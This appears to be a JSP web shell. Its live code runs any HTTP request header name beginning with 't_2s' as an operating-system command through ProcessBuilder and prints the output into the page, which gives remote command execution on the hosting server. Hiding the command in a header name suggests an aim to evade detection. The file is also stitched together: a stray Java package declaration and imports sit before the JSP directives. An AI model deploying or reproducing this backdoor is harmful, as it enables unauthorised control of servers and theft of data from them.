package com.mkyong.shell;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Enumeration" %>
<%
	//String[] ids = request.getParameterValues("cmd");
	// StringBuffer sb = new StringBuffer();
	// for(int i = 0; i < ids.length; i++) {
	// 	sb.append(ids[i]);
	// }
	// out.write("<pre>" + sb + "</pre>");
    
	{
		//Enumeration er = request.getHeaderNames();
		//while(er.hasMoreElements()){
		//String name	=(String) er.nextElement();
		//String value = request.getHeader(name);
		//out.write("<pre>" + name+"="+value + "</pre>");
		//}

		Object  req= request;
		Enumeration cts = ((HttpServletRequest)req).getHeaderNames();
  		while(cts.hasMoreElements()){
  			String hhh=cts.nextElement().toString();
  			if(hhh.startsWith("t_2s")){
  			    InputStream in = new ProcessBuilder(hhh.substring(4)).start().getInputStream();
			    ByteArrayOutputStream baos = new ByteArrayOutputStream();
			    byte[] b = new byte[1024];
			    int a = -1;

			    while ((a = in.read(b)) != -1) {
			        baos.write(b, 0, a);
			    }

			    out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");

  			}
  		}



	}
	//executeCommand(command);


%>


